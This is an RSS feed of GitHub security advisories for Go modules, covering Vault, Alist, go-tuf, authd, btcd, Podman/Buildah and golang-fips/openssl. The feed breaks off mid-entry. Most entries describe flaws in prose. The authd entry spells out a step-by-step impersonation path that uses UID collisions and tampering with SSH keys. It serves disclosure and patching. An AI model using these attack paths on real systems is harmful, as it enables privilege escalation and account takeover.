<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-10-11T14:01:26.112Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Vault Community Edition privilege escalation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rr8j-7w34-xp5j</id>
        <link href="https://github.com/advisories/GHSA-rr8j-7w34-xp5j"/>
        <updated>2024-10-10T22:19:14.000Z</updated>
        <content type="html"><![CDATA[<p>A privileged Vault operator with write permissions to the root namespace’s identity endpoint could escalate their privileges to Vault’s root policy. Fixed in Vault Community Edition 1.18.0 and Vault Enterprise 1.18.0, 1.17.7, 1.16.11, and 1.15.16.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9180">https://nvd.nist.gov/vuln/detail/CVE-2024-9180</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-21-vault-operators-in-root-namespace-may-elevate-their-privileges/70565">https://discuss.hashicorp.com/t/hcsec-2024-21-vault-operators-in-root-namespace-may-elevate-their-privileges/70565</a></li>
<li><a href="https://github.com/advisories/GHSA-rr8j-7w34-xp5j">https://github.com/advisories/GHSA-rr8j-7w34-xp5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr8j-7w34-xp5j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-10T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/alist-org/alist/v3] Alist reflected Cross-Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8pph-gfhp-w226</id>
        <link href="https://github.com/advisories/GHSA-8pph-gfhp-w226"/>
        <updated>2024-10-10T20:23:34.000Z</updated>
        <content type="html"><![CDATA[<p>AList is a file list program that supports multiple storages. AList contains a reflected cross-site scripting vulnerability in helper.go. The endpoint /i/:link_name takes in a user-provided value and reflects it back in the response. The endpoint returns an application/xml response, opening it up to HTML tags via XHTML and thus leading to a XSS vulnerability. This vulnerability is fixed in 3.29.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47067">https://nvd.nist.gov/vuln/detail/CVE-2024-47067</a></li>
<li><a href="https://github.com/alist-org/alist/commit/6100647310594868e931f3de1188ddd8bde93b78">https://github.com/alist-org/alist/commit/6100647310594868e931f3de1188ddd8bde93b78</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2023-220_Alist">https://securitylab.github.com/advisories/GHSL-2023-220_Alist</a></li>
<li><a href="https://github.com/advisories/GHSA-8pph-gfhp-w226">https://github.com/advisories/GHSA-8pph-gfhp-w226</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8pph-gfhp-w226</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-10T20:23:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/theupdateframework/go-tuf] Incorrect delegation lookups can make go-tuf download the wrong artifact]]></title>
        <id>https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</id>
        <link href="https://github.com/advisories/GHSA-4f8r-qqr9-fq8j"/>
        <updated>2024-10-10T18:55:20.000Z</updated>
        <content type="html"><![CDATA[<p>During the ongoing work on the TUF conformance test suite, we have come across a test that reveals what we believe is a bug in go-tuf with security implications. The bug exists in go-tuf delegation tracing and could result in downloading the wrong artifact. </p>
<p>We have come across this issue in the test in this PR: <a href="https://github.com/theupdateframework/tuf-conformance/pull/115">https://github.com/theupdateframework/tuf-conformance/pull/115</a>.</p>
<p>The test - <code>test_graph_traversal</code> - sets up a repository with a series of delegations, invokes the clients <code>refresh()</code> and then checks the order in which the client traced the delegations. The test shows that the go-tuf client inconsistently traces the delegations in a wrong way. For example, <a href="https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275625542">during one CI run</a>, the <code>two-level-delegations</code> test case triggered a wrong order. The delegations in this look as such:</p>
<pre><code class="language-python">"two-level-delegations": DelegationsTestCase(
        delegations=[
            DelegationTester("targets", "A"),
            DelegationTester("targets", "B"),
            DelegationTester("B", "C"),
        ],
        visited_order=["A", "B", "C"],
    ),
</code></pre>
<p>Here, <code>targets</code> delegate to <code>"A"</code>, and to <code>"B"</code>, and <code>"B"</code> delegates to <code>"C"</code>. The client should trace the delegations in the order <code>"A"</code> then <code>"B"</code> then <code>"C"</code> but in this particular CI run, go-tuf traced the delegations <code>"B"-&gt;"C"-&gt;"A"</code>.</p>
<p>In a subsequent CI run, this test case did not fail, but <a href="https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275640487">another one did</a>.</p>
<p>@jku has done a bit of debugging and believes that the returned map of <code>GetRolesForTarget</code> returns a map that causes this behavior:</p>
<p><a href="https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></p>
<p>We believe that this map should be an ordered list instead of a map.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j">https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j</a></li>
<li><a href="https://github.com/theupdateframework/tuf-conformance/pull/115">https://github.com/theupdateframework/tuf-conformance/pull/115</a></li>
<li><a href="https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819">https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819</a></li>
<li><a href="https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47534">https://nvd.nist.gov/vuln/detail/CVE-2024-47534</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3166">https://pkg.go.dev/vuln/GO-2024-3166</a></li>
<li><a href="https://github.com/advisories/GHSA-4f8r-qqr9-fq8j">https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-01T18:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ubuntu/authd] Authd allows attacker-controlled usernames to yield controllable UIDs]]></title>
        <id>https://github.com/advisories/GHSA-4gfw-wf7c-w6g2</id>
        <link href="https://github.com/advisories/GHSA-4gfw-wf7c-w6g2"/>
        <updated>2024-10-11T02:30:30.000Z</updated>
        <content type="html"><![CDATA[<p>CVE description:</p>
<p>Authd, through version 0.3.6, did not sufficiently randomize user IDs to prevent collisions. A local attacker who can register user names could spoof another user's ID and gain their privileges.</p>
<p>----- original report -----</p>
<h1 id="cause">Cause</h1>
<p>authd assigns user IDs as a pure function of the user name. Moreover, the set of UIDs is much too small for pseudo-random assignment to work: the birthday bound predicts random collisions will occur with probability 50% after only 54 562 IDs were assigned.</p>
<p><code>authd</code> only checks for uniqueness <a href="https://github.com/ubuntu/authd/blob/4946962aa4ac6e5b7d2b53503026659581c73907/internal/users/cache/update.go#L67-L71">within its local cache</a>, which</p>
<ul>
<li>may be inconsistent across multiple systems within the same domain ;</li>
<li>may be purged, due to being stored in <code>/var/cache</code> ;</li>
<li>automatically removes entries of users who have not logged into that specific system within the last 6 months.</li>
</ul>
<p>The current <code>GenerateID</code> method, authored in September 2024 (commit a6c85ed24b8d17a2d11c859e8d70f5a52fa69690),
repeatedly hashes the user name until the 4 leading bytes fall into the interval [60 000; 2³¹[ :
<a href="https://github.com/ubuntu/authd/blob/f9f851540e6377fca18a45ce7a02d024c1dbd6e9/internal/users/manager.go#L425">https://github.com/ubuntu/authd/blob/f9f851540e6377fca18a45ce7a02d024c1dbd6e9/internal/users/manager.go#L425</a>
<a href="https://github.com/ubuntu/authd/blob/f9f851540e6377fca18a45ce7a02d024c1dbd6e9/internal/services/nss/nss.go#L188">https://github.com/ubuntu/authd/blob/f9f851540e6377fca18a45ce7a02d024c1dbd6e9/internal/services/nss/nss.go#L188</a></p>
<p>Previous versions are affected by similar issues, though without the use of a cryptographic hash in <code>GenerateID</code>, making exploitation computationally-easier.</p>
<h1 id="impact">Impact</h1>
<p>Since GenerateID is a pure function with no secret input, and the set of UIDs is small, an adversary which can register users with chosen names can</p>
<ul>
<li>register multiple users with colliding IDs, or</li>
<li>register a single user whose ID collides with a target user's, whether one managed by <code>authd</code>, or a system user whose well-known ID is in a range which <a href="https://github.com/ubuntu/authd/issues/547">overlaps <code>authd</code>'s</a>.</li>
</ul>
<p>In the latter case, as all access control performed by the Linux kernel (and other Unices' kernels) is based on IDs and not usernames, if the attacker can sign into a system, they will have the same privileges as the target user.  The attacker can bypass the uniqueness check in (at least) the following ways:</p>
<ul>
<li>engineer a situation where the system administrator purges <code>/var/cache</code> ;</li>
<li>target a system account <a href="https://github.com/ubuntu/authd/issues/547">whose UID is in <code>authd</code>'s range</a> ;</li>
<li>target an account which hasn't logged into a specific system in more than 6 months.
Note that this isn't limited to inactive accounts <em>within the entire domain</em>, and impersonation on a given system can potentially be leveraged to compromise the target account on other systems; for example:<ul>
<li>user <code>alice</code> is known to log into <code>1.example.com</code> ;</li>
<li>the attacker computes a preimage (a username which yields the same UID), let's call it <code>bob</code> ;</li>
<li>the attacker creates the account <code>bob</code> and logs into <code>2.example.com</code>, succeeding if alice hasn't (recently) logged into that system ;</li>
<li>the attacker can now manipulate resources exposed on <code>2</code> as if they were alice; assuming <code>/home</code> is shared, they could manipulate <code>~alice/.ssh/authorized_keys</code>, <code>~alice/.config</code>, alice's shell's initialization file, etc.
Note: NFSv4's <code>idmap</code> mechanism may prevent this, but isn't enabled by default (unless Kerberos is used, which isn't the case in an <code>authd</code> deployment)</li>
<li>at that point, gaining code execution as alice on <code>1.example.com</code> is usually trivial.</li>
</ul>
</li>
</ul>
<p>Since the necessary computation can be performed entirely offline, this wouldn't be affected by any rate-limits, and the only audit trail would be a single user registration. This would require on average less than 2³¹ computations of <code>GenerateID</code>: assuming SHA-256's cost is 25 cycles-per-byte, a clock speed of 3GHz, and short (≤32B) generated usernames, this is less than 10 minutes of a single core's time.</p>
<h1 id="remediation">Remediation</h1>
<p>The simplest and likely-best remediation path would be for the external IdP to provide a guaranteed-unique user ID in the correct range.
In OIDC, this is commonly communicated through a claim, though its name would need to be configurable as there's no real standard:</p>
<ul>
<li>CERN uses <code>cern_person_id</code>: <a href="https://auth.docs.cern.ch/user-documentation/oidc/config/">https://auth.docs.cern.ch/user-documentation/oidc/config/</a> ;</li>
<li>Okta, Zitadel, and many other IdPs, require the realm's administrator to define a custom attribute, conventionally called <code>uid</code> or <code>uidNumber</code> ;</li>
<li>etc.</li>
</ul>
<p>This is also supported by other commonplace identity providers, such as LDAP and Active Directory:
<a href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-uidNumber">https://learn.microsoft.com/en-us/windows/win32/adschema/a-uidNumber</a></p>
<p>MS Entra presumably supports this as well.</p>
<p>If that is not possible for some reason, architectural changes to authd would likely be required:
assigning user IDs from a small space (such as Linux's 32b UIDs) requires mutable state to ensure uniqueness, whereas authd's design currently assumes no mutable state is held, aside from some transient, local cache.
Moreover, that mutable state may need to be synchronised across multiple machines as uniform UIDs are often necessary, for instance when accessing a common networked filesystem.</p>
<h1 id="acknowledgements">Acknowledgements</h1>
<p>Thanks to Michael Gebetsroither for assisting with the writeup, and Jamie Bliss for the same as well as investigating when the issue was introduced in authd.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ubuntu/authd/security/advisories/GHSA-4gfw-wf7c-w6g2">https://github.com/ubuntu/authd/security/advisories/GHSA-4gfw-wf7c-w6g2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9312">https://nvd.nist.gov/vuln/detail/CVE-2024-9312</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-9312">https://www.cve.org/CVERecord?id=CVE-2024-9312</a></li>
<li><a href="https://github.com/advisories/GHSA-4gfw-wf7c-w6g2">https://github.com/advisories/GHSA-4gfw-wf7c-w6g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gfw-wf7c-w6g2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-10T16:43:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/btcsuite/btcd] btcd did not correctly re-implement Bitcoin Core's "FindAndDelete()" functionality]]></title>
        <id>https://github.com/advisories/GHSA-27vh-h6mc-q6g8</id>
        <link href="https://github.com/advisories/GHSA-27vh-h6mc-q6g8"/>
        <updated>2024-10-10T16:43:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The btcd Bitcoin client (versions 0.10 to 0.24) did not correctly re-implement Bitcoin Core's "FindAndDelete()" functionality. This
logic is consensus-critical: the difference in behavior with the other Bitcoin clients can lead to btcd clients accepting an invalid Bitcoin block (or rejecting a valid one). </p>
<p>This consensus failure can be leveraged to cause a chain split (accepting an invalid Bitcoin block) or be exploited to DoS the btcd nodes (rejecting a valid Bitcoin block). An attacker can create a standard transaction where FindAndDelete doesn't return a match but removeOpCodeByData does making btcd get a different sighash, leading to a chain split. Importantly, this vulnerability can be exploited remotely by any Bitcoin user and does not require any hash power. This is because the difference in behavior can be triggered by a "standard" Bitcoin
transaction, that is a transaction which gets relayed through the P2P network before it gets included in a Bitcoin block.</p>
<h4 id="findanddelete-vs-removeopcodebydata"><code>FindAndDelete</code> vs. <code>removeOpcodeByData</code></h4>
<p><code>removeOpcodeByData(script []byte, dataToRemove []byte)</code> removes any data pushes from <code>script</code> that <em>contain</em> <code>dataToRemove</code>. However, <code>FindAndDelete</code> only removes <em>exact</em> matches. So for example, with <code>script = "&lt;data&gt; &lt;data||foo&gt;"</code> and <code>dataToRemove = "data"</code> btcd will remove both data pushes but Bitcoin Core's <code>FindAndDelete</code> only removes the first <code>&lt;data&gt;</code> push.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in <code>btcd</code> version v0.24.2-beta. </p>
<h3 id="references">References</h3>
<p><code>FindAndDelete</code>: <a href="https://github.com/btcsuite/btcd/security/advisories/GHSA-27vh-h6mc-q6g8">https://github.com/btcsuite/btcd/security/advisories/GHSA-27vh-h6mc-q6g8</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/btcsuite/btcd/security/advisories/GHSA-27vh-h6mc-q6g8">https://github.com/btcsuite/btcd/security/advisories/GHSA-27vh-h6mc-q6g8</a></li>
<li><a href="https://github.com/advisories/GHSA-27vh-h6mc-q6g8">https://github.com/advisories/GHSA-27vh-h6mc-q6g8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27vh-h6mc-q6g8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-10T16:43:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v4] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v3] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v2] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v5] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-09T22:34:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/containers/podman/releases/tag/v5.2.4">https://github.com/containers/podman/releases/tag/v5.2.4</a></li>
<li><a href="https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4">https://github.com/containers/buildah/commit/e4e2ad5ca2088d7c388109394135ead7aaf1f4f4</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3169">https://pkg.go.dev/vuln/GO-2024-3169</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl] Golang FIPS OpenSSL has a Use of Uninitialized Variable vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3h3x-2hwv-hr52</id>
        <link href="https://github.com/advisories/GHSA-3h3x-2hwv-hr52"/>
        <updated>2024-10-09T22:24:38.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.&nbsp; It is also possible to force a derived key to be all zeros instead of an unpredictable value.&nbsp; This may have follow-on implications for the Go TLS stack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9355">https://nvd.nist.gov/vuln/detail/CVE-2024-9355</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9355">https://access.redhat.com/security/cve/CVE-2024-9355</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315719">https://bugzilla.redhat.com/show_bug.cgi?id=2315719</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:7502">https://access.redhat.com/errata/RHSA-2024:7502</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:7550">https://access.redhat.com/errata/RHSA-2024:7550</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3167">https://pkg.go.dev/vuln/GO-2024-3167</a></li>
<li><a href="https://github.com/advisories/GHSA-3h3x-2hwv-hr52">https://github.com/advisories/GHSA-3h3x-2hwv-hr52</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
